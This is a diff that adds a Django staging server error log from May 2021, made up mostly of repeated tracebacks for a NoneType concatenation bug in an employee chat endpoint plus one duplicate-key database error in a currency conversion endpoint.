+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 2774, in post
+    thread_data = sender_emp_code + receiver_emp_code
+TypeError: must be str, not NoneType
+ERROR|19/May/2021 11:27:28|basehttp|699018|139768002758400|"POST /employee_chat/ HTTP/1.1" 500 18633
+ERROR|19/May/2021 12:54:40|log|699018|139767992006400|Internal Server Error: /employee_chat/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 2774, in post
+    thread_data = sender_emp_code + receiver_emp_code
+TypeError: must be str, not NoneType
+ERROR|19/May/2021 12:54:40|basehttp|699018|139767992006400|"POST /employee_chat/ HTTP/1.1" 500 18633
+ERROR|19/May/2021 14:25:47|exception|699018|139768002758400|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|19/May/2021 14:46:11|log|699018|139767765268224|Internal Server Error: /employee_chat/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 2774, in post
+    thread_data = sender_emp_code + receiver_emp_code
+TypeError: must be str, not NoneType
+ERROR|19/May/2021 14:46:11|basehttp|699018|139767765268224|"POST /employee_chat/ HTTP/1.1" 500 18632
+ERROR|19/May/2021 14:47:09|log|699018|139767992006400|Internal Server Error: /employee_chat/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 2774, in post
+    thread_data = sender_emp_code + receiver_emp_code
+TypeError: must be str, not NoneType
+ERROR|19/May/2021 14:47:09|basehttp|699018|139767992006400|"POST /employee_chat/ HTTP/1.1" 500 18632
+ERROR|19/May/2021 14:47:18|log|699018|139767992006400|Internal Server Error: /employee_chat/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 2774, in post
+    thread_data = sender_emp_code + receiver_emp_code
+TypeError: must be str, not NoneType
+ERROR|19/May/2021 14:47:18|basehttp|699018|139767992006400|"POST /employee_chat/ HTTP/1.1" 500 18632
+ERROR|19/May/2021 14:47:35|log|699018|139767992006400|Internal Server Error: /employee_chat/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 2774, in post
+    thread_data = sender_emp_code + receiver_emp_code
+TypeError: must be str, not NoneType
+ERROR|19/May/2021 14:47:35|basehttp|699018|139767992006400|"POST /employee_chat/ HTTP/1.1" 500 18632
+ERROR|19/May/2021 14:49:52|log|699018|139767992006400|Internal Server Error: /employee_chat/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 2774, in post
+    thread_data = sender_emp_code + receiver_emp_code
+TypeError: must be str, not NoneType
+ERROR|19/May/2021 14:49:52|basehttp|699018|139767992006400|"POST /employee_chat/ HTTP/1.1" 500 18632
+ERROR|19/May/2021 14:51:39|log|699018|139767765268224|Internal Server Error: /employee_chat/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 2774, in post
+    thread_data = sender_emp_code + receiver_emp_code
+TypeError: must be str, not NoneType
+ERROR|19/May/2021 14:51:39|basehttp|699018|139767765268224|"POST /employee_chat/ HTTP/1.1" 500 18632
+ERROR|19/May/2021 16:10:52|log|699018|139767975220992|Internal Server Error: /employee_chat/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/employee/views.py", line 2774, in post
+    thread_data = sender_emp_code + receiver_emp_code
+TypeError: must be str, not NoneType
+ERROR|19/May/2021 16:10:52|basehttp|699018|139767975220992|"POST /employee_chat/ HTTP/1.1" 500 18633
+ERROR|19/May/2021 16:39:18|log|699018|139767983613696|Internal Server Error: /post_currency_conversion/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "master_currency_conversion_history_pkey"
+DETAIL:  Key (id)=(42) already exists.
+
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/master/views/currency.py", line 312, in post
+    historyserializer.save()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 214, in save
+    self.instance = self.create(validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 943, in create
+    instance = ModelClass._default_manager.create(**validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 413, in create
+    obj.save(force_insert=True, using=self.db)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 717, in save
+    force_update=force_update, update_fields=update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 747, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 830, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 868, in _do_insert
+    using=using, raw=raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 1133, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1285, in execute_sql
+    cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 100, in execute
+    return super().execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 68, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 77, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/utils.py", line 89, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+django.db.utils.IntegrityError: duplicate key value violates unique constraint "master_currency_conversion_history_pkey"
+DETAIL:  Key (id)=(42) already exists.
+
+ERROR|19/May/2021 16:39:18|basehttp|699018|139767983613696|"POST /post_currency_conversion/ HTTP/1.1" 500 22912
